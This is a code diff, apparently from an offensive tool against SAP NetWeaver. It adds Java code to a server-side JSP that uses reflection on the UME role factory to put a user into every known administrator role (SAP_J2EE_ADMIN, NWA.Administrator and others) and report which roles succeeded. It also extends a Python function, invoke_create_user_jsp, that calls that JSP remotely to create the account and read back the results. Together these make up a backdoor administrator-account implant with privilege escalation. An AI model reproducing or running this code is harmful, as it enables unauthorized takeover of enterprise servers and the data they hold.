@@ -222,6 +222,60 @@ try {
         while (gc.getCause() != null) gc = gc.getCause();
         out.println("group_error=" + gc.getClass().getSimpleName() + ": " + gc.getMessage());
     }
+
+    // Also assign the J2EE admin UME ROLES directly.  On many NW
+    // installs, the "Administrators" UME group alone does NOT grant
+    // NWA application access — the webdynpro framework checks for
+    // specific role memberships (e.g. Administrator,
+    // SAP_J2EE_ADMIN, SAP.LM.FullAdministrator).  We try each known
+    // admin role name and record which ones were actually assignable
+    // on this particular build.
+    try {
+        Object rf = UMF.getMethod("getRoleFactory").invoke(null);
+        java.lang.reflect.Method getRoleByUniqueName =
+            rf.getClass().getMethod("getRoleByUniqueName", String.class);
+        java.lang.reflect.Method addUserToRole =
+            rf.getClass().getMethod("addUserToRole",
+                                      String.class, String.class);
+        String[] adminRoles = {
+            "Administrator",
+            "administrator",
+            "SAP_J2EE_ADMIN",
+            "SAP.LM.FullAdministrator",
+            "SAP.CI.FullAdministrator",
+            "sap.com/tc~lm~webadmin~mainframe~permissions:NWA.Administrator",
+        };
+        StringBuilder added = new StringBuilder();
+        StringBuilder skipped = new StringBuilder();
+        for (String rn : adminRoles) {
+            try {
+                Object role = getRoleByUniqueName.invoke(rf, rn);
+                if (role == null) {
+                    if (skipped.length() > 0) skipped.append(",");
+                    skipped.append(rn).append(":missing");
+                    continue;
+                }
+                String roleId = (String) role.getClass()
+                    .getMethod("getUniqueID").invoke(role);
+                addUserToRole.invoke(rf, userId, roleId);
+                if (added.length() > 0) added.append(",");
+                added.append(rn);
+            } catch (Throwable rt) {
+                Throwable rc = rt;
+                while (rc.getCause() != null) rc = rc.getCause();
+                if (skipped.length() > 0) skipped.append(",");
+                skipped.append(rn).append(":")
+                    .append(rc.getClass().getSimpleName());
+            }
+        }
+        if (added.length() > 0)   out.println("roles_added=" + added);
+        if (skipped.length() > 0) out.println("roles_skipped=" + skipped);
+    } catch (Throwable rootRt) {
+        Throwable rc = rootRt;
+        while (rc.getCause() != null) rc = rc.getCause();
+        out.println("roles_error=" + rc.getClass().getSimpleName()
+                     + ": " + rc.getMessage());
+    }
 } catch (Throwable t) {
     Throwable c = t;
     while (c.getCause() != null) c = c.getCause();
@@ -320,7 +374,8 @@ def invoke_create_user_jsp(jsp_url: str, username: str, password: str,
     req = urllib.request.Request(url, headers={"User-Agent": _UA})
     result = {"success": False, "status": "", "userid": "",
               "group": "", "groupid": "", "error": "", "raw": "",
-              "http_status": 0, "body_len": 0}
+              "http_status": 0, "body_len": 0,
+              "roles_added": "", "roles_skipped": "", "roles_error": ""}
     try:
         with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
             text = r.read().decode("latin1", errors="replace")
